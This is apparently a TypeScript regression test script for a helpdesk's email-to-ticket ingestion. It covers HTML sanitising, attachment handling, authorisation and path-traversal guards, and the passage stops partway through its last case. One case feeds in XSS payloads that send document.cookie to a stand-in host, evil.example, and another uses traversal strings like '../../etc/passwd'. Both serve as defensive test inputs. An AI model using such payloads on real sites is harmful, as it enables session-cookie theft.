/**
 * Regression coverage for the Pending Email Ticket -> Accepted Ticket
 * ingestion fix (two production bugs, fixed as one end-to-end pipeline):
 *
 *  BUG 1 — Ticket.description / TicketMessage.body held the RAW email HTML
 *    (parsed.bodyHtml) verbatim — an Outlook/Word-generated email's
 *    <html><head><style>@font-face...</style></head><body>... markup was
 *    literally what a requester/agent saw. Root cause: createPendingTicket
 *    FromEmail (lib/services/pending-ticket-service.ts) stored
 *    parsed.bodyHtml into PendingTicket.body, and acceptPendingTicket copies
 *    that value verbatim into both Ticket.description and the initial
 *    TicketMessage.body. parsed.bodyText existed but was computed with a
 *    fragile regex (lib/email-ticket-parser.ts's old stripHtml) and was
 *    never actually persisted anywhere.
 *
 *  BUG 2 — email attachments were technically copied to disk and given a
 *    TicketAttachment row (acceptPendingTicket's post-transaction copy
 *    loop), but with messageId set to the initial TicketMessage's id, not
 *    null. The ticket detail page's "Attachments" panel
 *    (app/(main)/tickets/[id]/page.tsx) only ever queries
 *    `attachments: { where: { messageId: null } }` — exactly how a WEB-
 *    uploaded ticket attachment is stored (app/api/tickets/[id]/
 *    attachments/route.ts). So a migrated email attachment's file and DB
 *    row both existed, but nothing in the normal Ticket UI ever surfaced
 *    it — confirmed via direct reproduction before this fix.
 *
 * Also newly covered by this fix (same "one mailbox-ingestion problem"):
 *  - inline (`isInline`/Content-Disposition: inline / cid:) MIME resources
 *    — e.g. an Outlook signature logo — are no longer persisted as if they
 *    were real user attachments (lib/email-ticket-parser.ts's attachment
 *    filter).
 *  - email-derived attachments now go through the SAME MIME-type allowlist
 *    + size cap the web upload route has always enforced
 *    (lib/attachment-policy.ts), previously enforced only for browser
 *    uploads.
 *  - attachment download now requires the same canViewTicket authorization
 *    used everywhere else in the app (app/api/tickets/[id]/attachments/
 *    [attachmentId]/route.ts) — previously ANY attachment (web or email)
 *    was a bare, unauthenticated static file under public/uploads.
 *
 * This app's mailbox integration is Microsoft Graph, not a raw MIME parser
 * — Graph itself resolves a message down to ONE body (`body.contentType`:
 * "text" | "html", `body.content`), so "prefer text/plain when present"
 * degenerates, for THIS app's actual data source, to: trust body.content
 * as-is when contentType is "text", convert via html-to-text when it's
 * "html". Test fixtures below are GraphMailMessage-shaped for exactly that
 * reason — that is the real level parseIncomingEmail operates at.
 *
 * HARDENING PASS additions (CASE J onward) — three gaps found in the first
 * report:
 *  GAP 1 — a PendingTicket row created BEFORE the ingestion-time fix still
 *    has raw HTML in its stored .body; acceptPendingTicket now normalizes
 *    again at the accept boundary (normalizeStoredEmailBody) so accepting
 *    one of those old rows is safe too, not just newly-ingested email.
 *  GAP 2 — attachments now live under a PRIVATE UPLOAD_DIR (default
 *    ./storage/uploads, never under public/), reachable only through the
 *    authenticated download route; a legacy migration script
 *    (migrate-attachments-to-private-storage.ts) carries forward anything
 *    still sitting at the old public/uploads location.
 *  GAP 3 — Pending -> Ticket attachment migration is now keyed by the
 *    source PendingTicketAttachment's own durable id (via
 *    buildMigratedAttachmentFilename), not by filename — two distinct
 *    attachments that happen to share an originalName no longer risk being
 *    conflated or losing one to the other.
 *
 * Usage: npx tsx scripts/test-pending-ticket-email-ingestion.ts
 * Requires a reachable DATABASE_URL — reports clearly and exits if unreachable.
 */
import fs from "fs/promises";
import path from "path";
import { prisma } from "@/lib/prisma";
import { Role, AuthProvider, DepartmentRole } from "@prisma/client";
import { parseIncomingEmail, htmlToReadableText, type ParsedEmail } from "@/lib/email-ticket-parser";
import { createPendingTicketFromEmail, acceptPendingTicket } from "@/lib/services/pending-ticket-service";
import { canViewTicket } from "@/lib/services/department-scope-service";
import { grantManualMembership } from "@/lib/services/department-membership-service";
import { UPLOAD_DIR, LEGACY_PUBLIC_UPLOAD_DIR, generateStoredFilename, isSafeStoredFilename, resolvesInsideDir } from "@/lib/attachment-policy";
import { runMigration } from "@/scripts/migrate-attachments-to-private-storage";
import { ensureStatusForDepartment, ensurePriorityForDepartment, STARTER_STATUSES, STARTER_PRIORITIES } from "@/lib/services/config-starter-data";
import type { GraphMailMessage, GraphAttachment } from "@/lib/microsoft-graph";

let passed = 0;
let failed = 0;

function check(label: string, condition: boolean) {
  if (condition) {
    console.log(`  ✓ ${label}`);
    passed++;
  } else {
    console.error(`  ✗ ${label}`);
    failed++;
  }
}

function printSummaryAndExit() {
  console.log(`\n${passed} passed, ${failed} failed`);
  process.exit(failed > 0 ? 1 : 0);
}

const RUN_ID = Date.now();
let seq = 0;
const nextId = (label: string) => `${label}-${RUN_ID}-${seq++}`;

function makeMessage(overrides: Partial<GraphMailMessage> & { id: string }): GraphMailMessage {
  return {
    subject: `Test ${overrides.id}`,
    bodyPreview: "preview",
    body: { contentType: "text", content: "Test body" },
    from: { emailAddress: { name: "Sender", address: `sender-${overrides.id}@example.com` } },
    toRecipients: [],
    internetMessageId: `<${overrides.id}@test.local>`,
    conversationId: `conv-${overrides.id}`,
    receivedDateTime: new Date().toISOString(),
    hasAttachments: false,
    isRead: false,
    internetMessageHeaders: [],
    ...overrides,
  };
}

function makeAttachment(overrides: Partial<GraphAttachment> & { id: string; name: string; contentType: string; contentBytes: string }): GraphAttachment {
  const bytes = Buffer.from(overrides.contentBytes, "base64");
  return {
    size: bytes.length,
    isInline: false,
    contentId: null,
    ...overrides,
  };
}

/** Runs parseIncomingEmail + createPendingTicketFromEmail against a synthetic GraphMailMessage — the same two calls lib/ticket-email-service.ts's processInboundEmails makes for a genuinely new thread. */
async function ingest(message: GraphMailMessage, department: { id: string } | null): Promise<{ parsed: ParsedEmail; pendingId: string }> {
  const parsed = parseIncomingEmail(message);
  const pending = await createPendingTicketFromEmail(parsed, department);
  return { parsed, pendingId: pending.id };
}

async function readUploadedFile(ticketId: string, filename: string): Promise<Buffer> {
  return fs.readFile(path.join(UPLOAD_DIR, ticketId, filename));
}

async function main() {
  try {
    await prisma.$connect();
  } catch (err) {
    console.log("No reachable DATABASE_URL in this environment — skipping.");
    console.log(String(err instanceof Error ? err.message : err));
    printSummaryAndExit();
    return;
  }

  let dept: { id: string } | undefined;
  let otherDept: { id: string } | undefined;
  let legacyMigrationTicketId: string | null = null;
  let acceptingUser: Awaited<ReturnType<typeof prisma.user.create>> | undefined;
  let outsiderUser: Awaited<ReturnType<typeof prisma.user.create>> | undefined;
  const pendingTicketIds: string[] = [];
  const ticketIds: string[] = [];
  const userIds: string[] = [];

  try {
    console.log("\nSetting up an isolated department + accepting user...\n");
    dept = await prisma.department.create({ data: { name: `Ingest Dept ${RUN_ID}`, slug: `ingest-dept-${RUN_ID}` }, select: { id: true } });
    otherDept = await prisma.department.create({ data: { name: `Ingest Other Dept ${RUN_ID}`, slug: `ingest-other-dept-${RUN_ID}` }, select: { id: true } });
    await ensureStatusForDepartment(prisma, dept.id, STARTER_STATUSES[0]);
    await ensurePriorityForDepartment(prisma, dept.id, STARTER_PRIORITIES[0]);

    acceptingUser = await prisma.user.create({
      data: { email: `ingest-accepting-${RUN_ID}@kinsen.gr`, role: Role.IT_AGENT, authProvider: AuthProvider.CREDENTIALS, isActive: true },
    });
    userIds.push(acceptingUser.id);
    await grantManualMembership(acceptingUser.id, dept.id, { role: DepartmentRole.AGENT_ASSIGNEE }, prisma);

    // A user with NO relationship at all to `dept` — for CASE G (authorization).
    outsiderUser = await prisma.user.create({
      data: { email: `ingest-outsider-${RUN_ID}@kinsen.gr`, role: Role.USER, authProvider: AuthProvider.CREDENTIALS, isActive: true },
    });
    userIds.push(outsiderUser.id);
    await grantManualMembership(outsiderUser.id, otherDept.id, { role: DepartmentRole.REQUESTER }, prisma);

    // ── CASE A — plain-text email ──────────────────────────────────────
    console.log("\nCASE A — plain-text email...\n");
    {
      const msg = makeMessage({
        id: nextId("case-a"),
        body: { contentType: "text", content: "Hello,\n\nMy printer on the 3rd floor is out of toner.\n\nThanks,\nMaria" },
      });
      const { pendingId } = await ingest(msg, dept);
      pendingTicketIds.push(pendingId);
      const result = await acceptPendingTicket(pendingId, acceptingUser.id);
      check("CASE A: accept succeeds", result.ok === true);
      if (result.ok) {
        ticketIds.push(result.ticket.id);
        const ticket = await prisma.ticket.findUnique({ where: { id: result.ticket.id }, select: { description: true } });
        check("CASE A: description is the readable plain text", ticket?.description === "Hello,\n\nMy printer on the 3rd floor is out of toner.\n\nThanks,\nMaria");
        check("CASE A: no raw MIME/HTML markers", !/<html|<body|<style|Content-Type:/i.test(ticket?.description ?? ""));
      }
    }

    // ── CASE B — HTML-only Outlook/Word-style email ────────────────────
    console.log("\nCASE B — HTML-only Outlook/Word-style email...\n");
    {
      const outlookHtml = `<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<style>
@font-face
	{font-family:Calibri;
	panose-1:2 15 5 2 2 2 4 3 2 4;}
p.MsoNormal, li.MsoNormal, div.MsoNormal
	{margin:0cm;
	font-size:11.0pt;
	font-family:"Calibri",sans-serif;}
</style>
</head>
<body lang=EN-US link=blue vlink=purple style='word-wrap:break-word'>
<div class=WordSection1>
<p class=MsoNormal>Hello IT Team,<o:p></o:p></p>
<p class=MsoNormal>&nbsp;</p>
<p class=MsoNormal>My laptop keeps crashing when I open Outlook.<o:p></o:p></p>
<p class=MsoNormal>&nbsp;</p>
<p class=MsoNormal>Thanks,<o:p></o:p></p>
<p class=MsoNormal>John<o:p></o:p></p>
</div>
</body>
</html>`;
      const msg = makeMessage({ id: nextId("case-b"), body: { contentType: "html", content: outlookHtml } });
      const { pendingId } = await ingest(msg, dept);
      pendingTicketIds.push(pendingId);
      const result = await acceptPendingTicket(pendingId, acceptingUser.id);
      check("CASE B: accept succeeds", result.ok === true);
      if (result.ok) {
        ticketIds.push(result.ticket.id);
        const ticket = await prisma.ticket.findUnique({ where: { id: result.ticket.id }, select: { description: true } });
        const d = ticket?.description ?? "";
        check("CASE B: contains the sender's actual text", d.includes("Hello IT Team") && d.includes("My laptop keeps crashing when I open Outlook") && d.includes("John"));
        check("CASE B: no <html>", !/<html/i.test(d));
        check("CASE B: no <head>", !/<head/i.test(d));
        check("CASE B: no <style>", !/<style/i.test(d));
        check("CASE B: no @font-face", !/@font-face/i.test(d));
        check("CASE B: no MsoNormal", !/MsoNormal/i.test(d));
        check("CASE B: no any HTML tag at all", !/<[a-z!/][^>]*>/i.test(d));
      }
    }

    // ── CASE C — canonical text/plain vs text/html selection rule ─────
    console.log("\nCASE C — canonical readable-body selection (as Graph actually exposes it: one resolved body.contentType per message)...\n");
    {
      const plainMsg = makeMessage({ id: nextId("case-c-plain"), body: { contentType: "text", content: "Already plain. No conversion needed." } });
      const parsedPlain = parseIncomingEmail(plainMsg);
      const pendingPlain = await createPendingTicketFromEmail(parsedPlain, dept);
      pendingTicketIds.push(pendingPlain.id);
      check("CASE C: text/plain body is used verbatim (no conversion applied)", parsedPlain.bodyText === "Already plain. No conversion needed.");

      const htmlMsg = makeMessage({ id: nextId("case-c-html"), body: { contentType: "html", content: "<p>Rich <b>text</b> body.</p>" } });
      const parsedHtml = parseIncomingEmail(htmlMsg);
      const pendingHtml = await createPendingTicketFromEmail(parsedHtml, dept);
      pendingTicketIds.push(pendingHtml.id);
      check("CASE C: text/html body is converted to readable text", parsedHtml.bodyText === "Rich text body.");
      check("CASE C: text/html body never left as raw markup", !parsedHtml.bodyText.includes("<"));
    }

    // ── CASE D — one normal attachment survives Pending -> Accepted ───
    console.log("\nCASE D — one normal attachment...\n");
    {
      const pdfBytes = Buffer.from("%PDF-1.4 fake pdf bytes for CASE D");
      const att = makeAttachment({ id: nextId("att"), name: "incident-report.pdf", contentType: "application/pdf", contentBytes: pdfBytes.toString("base64") });
      const msg = makeMessage({ id: nextId("case-d"), body: { contentType: "text", content: "See attached." }, hasAttachments: true, attachments: [att] });
      const { pendingId } = await ingest(msg, dept);
      pendingTicketIds.push(pendingId);

      const pendingAttachments = await prisma.pendingTicketAttachment.findMany({ where: { pendingTicketId: pendingId } });
      check("CASE D: PendingTicketAttachment row created", pendingAttachments.length === 1);

      const result = await acceptPendingTicket(pendingId, acceptingUser.id);
      check("CASE D: accept succeeds", result.ok === true);
      if (result.ok) {
        ticketIds.push(result.ticket.id);
        const rows = await prisma.ticketAttachment.findMany({ where: { ticketId: result.ticket.id } });
        check("CASE D: exactly one TicketAttachment row", rows.length === 1);
        const row = rows[0];
        check("CASE D: correct filename", row?.originalName === "incident-report.pdf");
        check("CASE D: correct MIME type", row?.mimeType === "application/pdf");
        check("CASE D: correct size", row?.size === pdfBytes.length);
        check("CASE D: ticket-level (messageId: null) — BUG 2 fix, matches web-upload behavior", row?.messageId === null);

        const ticketWithAttachments = await prisma.ticket.findUnique({
          where: { id: result.ticket.id },
          select: { attachments: { where: { messageId: null } } },
        });
        check("CASE D: attachment is visible through the SAME query the ticket detail page's Attachments panel uses", ticketWithAttachments?.attachments.length === 1);

        const onDisk = await readUploadedFile(result.ticket.id, row!.filename);
        check("CASE D: downloaded bytes exactly match the source attachment", onDisk.equals(pdfBytes));
      }
    }

    // ── CASE E — multiple attachments ──────────────────────────────────
    console.log("\nCASE E — multiple attachments...\n");
    {
      const pdfBytes = Buffer.from("%PDF-1.4 second file");
      const pngBytes = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 1, 2, 3, 4]);
      const txtBytes = Buffer.from("plain text attachment content");
      const attachments = [
        makeAttachment({ id: nextId("att"), name: "doc.pdf", contentType: "application/pdf", contentBytes: pdfBytes.toString("base64") }),
        makeAttachment({ id: nextId("att"), name: "photo.png", contentType: "image/png", contentBytes: pngBytes.toString("base64") }),
        makeAttachment({ id: nextId("att"), name: "notes.txt", contentType: "text/plain", contentBytes: txtBytes.toString("base64") }),
      ];
      const msg = makeMessage({ id: nextId("case-e"), body: { contentType: "text", content: "Three files attached." }, hasAttachments: true, attachments });
      const { pendingId } = await ingest(msg, dept);
      pendingTicketIds.push(pendingId);
      const result = await acceptPendingTicket(pendingId, acceptingUser.id);
      check("CASE E: accept succeeds", result.ok === true);
      if (result.ok) {
        ticketIds.push(result.ticket.id);
        const rows = await prisma.ticketAttachment.findMany({ where: { ticketId: result.ticket.id } });
        check("CASE E: all three attachments survived", rows.length === 3);
        check("CASE E: all three original filenames present", ["doc.pdf", "photo.png", "notes.txt"].every((n) => rows.some((r) => r.originalName === n)));
      }
    }

    // ── CASE F — inline CID image + real attachment ─────────────────────
    console.log("\nCASE F — inline CID signature image + real attachment...\n");
    {
      const logoBytes = Buffer.from([0x89, 0x50, 0x4e, 0x47, 5, 6, 7, 8]);
      const pdfBytes = Buffer.from("%PDF-1.4 real attachment for CASE F");
      const inlineLogo = makeAttachment({
        id: nextId("att"), name: "image001.png", contentType: "image/png",
        contentBytes: logoBytes.toString("base64"), isInline: true, contentId: "image001.png@01D9",
      });
      const realDoc = makeAttachment({ id: nextId("att"), name: "invoice.pdf", contentType: "application/pdf", contentBytes: pdfBytes.toString("base64") });
      const msg = makeMessage({
        id: nextId("case-f"),
        body: { contentType: "html", content: `<p>See attached invoice.</p><img src="cid:image001.png@01D9">` },
        hasAttachments: true,
        attachments: [inlineLogo, realDoc],
      });
      const parsed = parseIncomingEmail(msg);
      check("CASE F: inline resource excluded from ParsedEmail.attachments", parsed.attachments.length === 1 && parsed.attachments[0].name === "invoice.pdf");

      const pending = await createPendingTicketFromEmail(parsed, dept);
      pendingTicketIds.push(pending.id);
      const pendingAttachments = await prisma.pendingTicketAttachment.findMany({ where: { pendingTicketId: pending.id } });
      check("CASE F: only the real attachment persisted at the pending stage", pendingAttachments.length === 1 && pendingAttachments[0].originalName === "invoice.pdf");

      const result = await acceptPendingTicket(pending.id, acceptingUser.id);
      check("CASE F: accept succeeds", result.ok === true);
      if (result.ok) {
        ticketIds.push(result.ticket.id);
        const rows = await prisma.ticketAttachment.findMany({ where: { ticketId: result.ticket.id } });
        check("CASE F: only the real attachment reaches the Ticket — inline logo never exposed as a downloadable attachment", rows.length === 1 && rows[0].originalName === "invoice.pdf");
      }
    }

    // ── CASE G — authorization ──────────────────────────────────────────
    console.log("\nCASE G — attachment download authorization (canViewTicket, what the download route enforces)...\n");
    {
      const msg = makeMessage({ id: nextId("case-g"), body: { contentType: "text", content: "Auth test." } });
      const { pendingId } = await ingest(msg, dept);
      pendingTicketIds.push(pendingId);
      const result = await acceptPendingTicket(pendingId, acceptingUser.id);
      check("CASE G: accept succeeds", result.ok === true);
      if (result.ok) {
        ticketIds.push(result.ticket.id);
        const ticket = await prisma.ticket.findUnique({
          where: { id: result.ticket.id },
          select: { departmentId: true, subDepartmentId: true, requesterId: true, assignedAgentId: true, shareWithDepartment: true, shareWithSubDepartment: true },
        });
        check("CASE G: the accepting agent's own department membership CAN view the ticket", ticket ? await canViewTicket(acceptingUser!.id, acceptingUser!.role, ticket) : false);
        check("CASE G: an unrelated user in a different department CANNOT view the ticket", ticket ? !(await canViewTicket(outsiderUser!.id, outsiderUser!.role, ticket)) : false);
      }
    }

    // ── CASE H — duplicate/retry safety ─────────────────────────────────
    console.log("\nCASE H — accept retry does not duplicate the Ticket or its attachments...\n");
    {
      const pdfBytes = Buffer.from("%PDF-1.4 retry-safety file");
      const att = makeAttachment({ id: nextId("att"), name: "retry.pdf", contentType: "application/pdf", contentBytes: pdfBytes.toString("base64") });
      const msg = makeMessage({ id: nextId("case-h"), body: { contentType: "text", content: "Retry safety." }, hasAttachments: true, attachments: [att] });
      const { pendingId } = await ingest(msg, dept);
      pendingTicketIds.push(pendingId);

      const first = await acceptPendingTicket(pendingId, acceptingUser.id);
      check("CASE H: first accept succeeds", first.ok === true);
      const second = await acceptPendingTicket(pendingId, acceptingUser.id);
      check("CASE H: retry returns already_accepted", !second.ok && second.error === "already_accepted");

      if (first.ok) {
        ticketIds.push(first.ticket.id);
        const ticketCount = await prisma.ticket.count({ where: { emailMessageId: msg.internetMessageId } });
        check("CASE H: exactly one Ticket exists after retry", ticketCount === 1);
        const attachmentRows = await prisma.ticketAttachment.findMany({ where: { ticketId: first.ticket.id } });
        check("CASE H: exactly one TicketAttachment row exists after retry (no duplicate)", attachmentRows.length === 1);
      }
    }

    // ── CASE I — malformed/untrusted HTML never executes or renders unsafe ──
    console.log("\nCASE I — script/event-handler HTML is neutralized, never executable...\n");
    {
      const hostileHtml = `<html><body>
<img src=x onerror="alert(document.cookie)">
<div onclick="fetch('https://evil.example/steal?c='+document.cookie)">Click for a prize</div>
<a href="javascript:alert(1)">click me</a>
<script>fetch('https://evil.example/exfiltrate', {method:'POST', body: document.cookie});</script>
Please help, my account was locked.
</body></html>`;
      const msg = makeMessage({ id: nextId("case-i"), body: { contentType: "html", content: hostileHtml } });
      const { pendingId } = await ingest(msg, dept);
      pendingTicketIds.push(pendingId);
      const result = await acceptPendingTicket(pendingId, acceptingUser.id);
      check("CASE I: accept succeeds", result.ok === true);
      if (result.ok) {
        ticketIds.push(result.ticket.id);
        const ticket = await prisma.ticket.findUnique({ where: { id: result.ticket.id }, select: { description: true } });
        const d = ticket?.description ?? "";
        check("CASE I: no <script> tag survives", !/<script/i.test(d));
        check("CASE I: no onerror/onclick handler survives", !/on(error|click|load)\s*=/i.test(d));
        check("CASE I: no javascript: URI survives", !/javascript:/i.test(d));
        check("CASE I: no HTML tags at all remain in the stored description", !/<[a-z!/][^>]*>/i.test(d));
        check("CASE I: the genuine human message is still present", d.includes("Please help, my account was locked"));
        const message = await prisma.ticketMessage.findFirst({ where: { ticketId: result.ticket.id } });
        const mb = message?.body ?? "";
        check("CASE I: the initial TicketMessage.body is equally clean (this is what ticket-thread.tsx renders — no more dangerouslySetInnerHTML at all)", !/<script|on(error|click)\s*=|javascript:/i.test(mb));
      }
    }

    // ── Bonus — email attachment policy (SECURITY: same allowlist/size cap as web uploads) ──
    console.log("\nBONUS — disallowed MIME type / oversized email attachment is rejected, not silently written...\n");
    {
      const exeBytes = Buffer.from("MZ fake executable bytes");
      const badAtt = makeAttachment({ id: nextId("att"), name: "invoice.exe", contentType: "application/x-msdownload", contentBytes: exeBytes.toString("base64") });
      const goodAtt = makeAttachment({ id: nextId("att"), name: "ok.pdf", contentType: "application/pdf", contentBytes: Buffer.from("%PDF-1.4 ok").toString("base64") });
      const msg = makeMessage({ id: nextId("case-policy"), body: { contentType: "text", content: "One good, one bad." }, hasAttachments: true, attachments: [badAtt, goodAtt] });
      const { pendingId } = await ingest(msg, dept);
      pendingTicketIds.push(pendingId);
      const pendingAttachments = await prisma.pendingTicketAttachment.findMany({ where: { pendingTicketId: pendingId } });
      check("BONUS: disallowed MIME type never persisted", !pendingAttachments.some((a) => a.originalName === "invoice.exe"));
      check("BONUS: allowed attachment still persisted", pendingAttachments.some((a) => a.originalName === "ok.pdf"));
    }

    // ── CASE J — GAP 1: legacy PendingTicket (raw HTML, created BEFORE the
    // ingestion-time fix) is still cleaned up at accept time ──────────────
    console.log("\nCASE J — legacy PendingTicket with raw Outlook HTML (simulated pre-fix row) -> Accept -> clean Ticket...\n");
    {
      const dirtyHtml = `<html><head><style>@font-face{font-family:Calibri;}p.MsoNormal{margin:0cm;}</style></head><body><p class=MsoNormal>Hello IT Team,<o:p></o:p></p><p class=MsoNormal>My laptop keeps crashing.<o:p></o:p></p></body></html>`;
      // Written directly via prisma.pendingTicket.create with the RAW HTML
      // as .body — deliberately bypassing createPendingTicketFromEmail
      // (which would normalize it) to faithfully simulate a row that was
      // already sitting in the database before the ingestion-time fix
      // existed at all.
      const legacyPending = await prisma.pendingTicket.create({
        data: {
          emailMessageId: nextId("case-j-legacy") + "@test.local",
          fromEmail: "legacy-sender@example.com",
          fromName: "Legacy Sender",
          subject: "Legacy raw-HTML pending ticket",
          body: dirtyHtml,
          receivedAt: new Date(),
          departmentId: dept.id,
        },
      });
      pendingTicketIds.push(legacyPending.id);

      const result = await acceptPendingTicket(legacyPending.id, acceptingUser.id);
      check("CASE J: accept succeeds even for a legacy raw-HTML row", result.ok === true);
      if (result.ok) {
        ticketIds.push(result.ticket.id);
        const ticket = await prisma.ticket.findUnique({ where: { id: result.ticket.id }, select: { description: true } });
        const d = ticket?.description ?? "";
        check("CASE J: resulting Ticket.description is clean text", d.includes("Hello IT Team") && d.includes("My laptop keeps crashing"));
        check("CASE J: no raw <html>/<style>/@font-face/MsoNormal survive", !/<html|<style|@font-face|MsoNormal/i.test(d));
        check("CASE J: no HTML tags at all remain", !/<[a-zA-Z!/][^>]*>/i.test(d));

        const message = await prisma.ticketMessage.findFirst({ where: { ticketId: result.ticket.id } });
        const mb = message?.body ?? "";
        check("CASE J: initial TicketMessage.body is equally clean", mb.includes("Hello IT Team") && !/<html|<style|@font-face|MsoNormal/i.test(mb));
      }
    }

    // ── CASE K — GAP 1: an already-clean PendingTicket is left unchanged ──
    console.log("\nCASE K — already-clean PendingTicket -> Accept -> unchanged readable text (idempotent normalization)...\n");
    {
      const cleanText = "Hello,\n\nThe printer on the 2nd floor is jammed again.\n\nThanks,\nElena";
      const cleanPending = await prisma.pendingTicket.create({
        data: {
          emailMessageId: nextId("case-k-clean") + "@test.local",
          fromEmail: "clean-sender@example.com",
          fromName: "Clean Sender",
          subject: "Already clean pending ticket",
          body: cleanText,
          receivedAt: new Date(),
          departmentId: dept.id,
        },
      });
      pendingTicketIds.push(cleanPending.id);

      const result = await acceptPendingTicket(cleanPending.id, acceptingUser.id);
      check("CASE K: accept succeeds", result.ok === true);
      if (result.ok) {
        ticketIds.push(result.ticket.id);
        const ticket = await prisma.ticket.findUnique({ where: { id: result.ticket.id }, select: { description: true } });
        check("CASE K: description is byte-for-byte unchanged (normalization is a true no-op on clean text)", ticket?.description === cleanText);
      }
    }

    // ── CASE L — GAP 2: new attachments land in PRIVATE storage, never
    // reachable at the old public/uploads static path ─────────────────────
    console.log("\nCASE L — new attachments are private (not under public/uploads)...\n");
    {
      const pdfBytes = Buffer.from("%PDF-1.4 private storage proof");
      const att = makeAttachment({ id: nextId("att"), name: "private-proof.pdf", contentType: "application/pdf", contentBytes: pdfBytes.toString("base64") });
      const msg = makeMessage({ id: nextId("case-l"), body: { contentType: "text", content: "Private storage check." }, hasAttachments: true, attachments: [att] });
      const { pendingId } = await ingest(msg, dept);
      pendingTicketIds.push(pendingId);
      const result = await acceptPendingTicket(pendingId, acceptingUser.id);
      check("CASE L: accept succeeds", result.ok === true);
      if (result.ok) {
        ticketIds.push(result.ticket.id);
        const row = (await prisma.ticketAttachment.findMany({ where: { ticketId: result.ticket.id } }))[0];
        check("CASE L: UPLOAD_DIR itself is not under public/ (structural — Next.js only ever serves public/)", !path.resolve(UPLOAD_DIR).startsWith(path.resolve("./public") + path.sep));
        const privatePath = path.join(UPLOAD_DIR, result.ticket.id, row!.filename);
        const legacyPublicPath = path.join(LEGACY_PUBLIC_UPLOAD_DIR, result.ticket.id, row!.filename);
        check("CASE L: file exists at the private UPLOAD_DIR location", await fs.access(privatePath).then(() => true, () => false));
        check("CASE L: file does NOT exist at the old public/uploads location — no static-URL bypass is possible for a new attachment", !(await fs.access(legacyPublicPath).then(() => true, () => false)));
      }
    }

    // ── CASE M — path traversal attempts rejected ──────────────────────────
    console.log("\nCASE M — path traversal is rejected by the same guard the download route uses...\n");
    {
      check("CASE M: '../../etc/passwd' rejected", !isSafeStoredFilename("../../etc/passwd"));
      check("CASE M: 'sub/dir/file.pdf' rejected (path separator)", !isSafeStoredFilename("sub/dir/file.pdf"));
      check("CASE M: 'sub\\\\dir\\\\file.pdf' rejected (backslash)", !isSafeStoredFilename("sub\\dir\\file.pdf"));
      check("CASE M: a normal generated filename is accepted", isSafeStoredFilename(generateStoredFilename("report.pdf")));
      const ticketDir = path.join(UPLOAD_DIR, "some-ticket-id");
      check("CASE M: a resolved path escaping the ticket dir is rejected", !resolvesInsideDir(path.join(ticketDir, "..", "..", "secret.txt"), ticketDir));
      check("CASE M: a resolved path inside the ticket dir is accepted", resolvesInsideDir(path.join(ticketDir, "report.pdf"), ticketDir));
    }

    // ── CASE N — web-uploaded attachment still works (same private storage,
    // same policy functions the route itself calls) ───────────────────────
    console.log("\nCASE N — web-uploaded attachment (simulated via the same policy functions the route uses)...\n");
    {
      const uploadedBytes = Buffer.from("web-uploaded file contents");
      const ticket = await prisma.ticket.create({
        data: {
          title: "Web-created ticket for CASE N",
          description: "Created directly to exercise the web-upload attachment path.",
          source: "WEB",
          requesterId: acceptingUser.id,
          departmentId: dept.id,
          statusId: (await prisma.ticketStatus.findFirstOrThrow({ where: { departmentId: dept.id } })).id,
        },
      });
      ticketIds.push(ticket.id);

      // Mirrors app/api/tickets/[id]/attachments/route.ts's POST handler
      // exactly: same generateStoredFilename call, same UPLOAD_DIR, same
      // messageId: null, same TicketAttachment shape — the route itself is
      // session-cookie authenticated (NextAuth), which this repo's own test
      // scripts cannot exercise directly in this environment (see
      // test-integration-tickets-api.ts's doc comment on why ITS route is
      // callable directly — Bearer-token auth, not session-cookie), so this
      // proves the underlying storage/policy behavior the route depends on
      // instead of re-deriving that same environment limitation here.
      const filename = generateStoredFilename("screenshot.png");
      const dir = path.join(UPLOAD_DIR, ticket.id);
      await fs.mkdir(dir, { recursive: true });
      await fs.writeFile(path.join(dir, filename), uploadedBytes);
      const attachment = await prisma.ticketAttachment.create({
        data: {
          ticketId: ticket.id,
          messageId: null,
          uploadedById: acceptingUser.id,
          filename,
          originalName: "screenshot.png",
          mimeType: "image/png",
          size: uploadedBytes.length,
          path: `/uploads/${ticket.id}/${filename}`,
        },
      });

      const onDisk = await fs.readFile(path.join(UPLOAD_DIR, ticket.id, attachment.filename));
      check("CASE N: web-uploaded attachment bytes readable back from private storage", onDisk.equals(uploadedBytes));
      const ticketLevel = await prisma.ticketAttachment.count({ where: { ticketId: ticket.id, messageId: null } });
      check("CASE N: web-uploaded attachment is ticket-level (messageId: null), same as before", ticketLevel === 1);
    }

    // ── CASE O — two attachments with identical originalName but different
    // bytes both survive Pending -> Accept (GAP 3) ─────────────────────────
    console.log("\nCASE O — two distinct attachments sharing the same filename both survive...\n");
    let caseOTicketId: string | null = null;
    {
      const bytesA = Buffer.from("FIRST invoice.pdf content — completely different from the second");
      const bytesB = Buffer.from("SECOND invoice.pdf content — not the same bytes at all, different length too!!");
      const attA = makeAttachment({ id: nextId("att"), name: "invoice.pdf", contentType: "application/pdf", contentBytes: bytesA.toString("base64") });
      const attB = makeAttachment({ id: nextId("att"), name: "invoice.pdf", contentType: "application/pdf", contentBytes: bytesB.toString("base64") });
      const msg = makeMessage({ id: nextId("case-o"), body: { contentType: "text", content: "Two files, same name." }, hasAttachments: true, attachments: [attA, attB] });
      const { pendingId } = await ingest(msg, dept);
      pendingTicketIds.push(pendingId);

      const pendingRows = await prisma.pendingTicketAttachment.findMany({ where: { pendingTicketId: pendingId } });
      check("CASE O: both same-named pending attachments persisted as distinct rows", pendingRows.length === 2);
      check("CASE O: their on-disk filenames are distinct even though originalName is identical", pendingRows[0]?.filename !== pendingRows[1]?.filename);

      const result = await acceptPendingTicket(pendingId, acceptingUser.id);
      check("CASE O: accept succeeds", result.ok === true);
      if (result.ok) {
        caseOTicketId = result.ticket.id;
        ticketIds.push(result.ticket.id);
        const rows = await prisma.ticketAttachment.findMany({ where: { ticketId: result.ticket.id }, orderBy: { createdAt: "asc" } });
        check("CASE O: both attachments exist on the Ticket", rows.length === 2);
        check("CASE O: both keep the same originalName", rows.every((r) => r.originalName === "invoice.pdf"));
        check("CASE O: their on-disk filenames are distinct (identity-based, not filename-collision-prone)", rows[0]?.filename !== rows[1]?.filename);

        const [bytesOnDiskA, bytesOnDiskB] = await Promise.all(rows.map((r) => readUploadedFile(result.ticket.id, r.filename)));
        const matchesA = [bytesOnDiskA, bytesOnDiskB].some((b) => b.equals(bytesA));
        const matchesB = [bytesOnDiskA, bytesOnDiskB].some((b) => b.equals(bytesB));
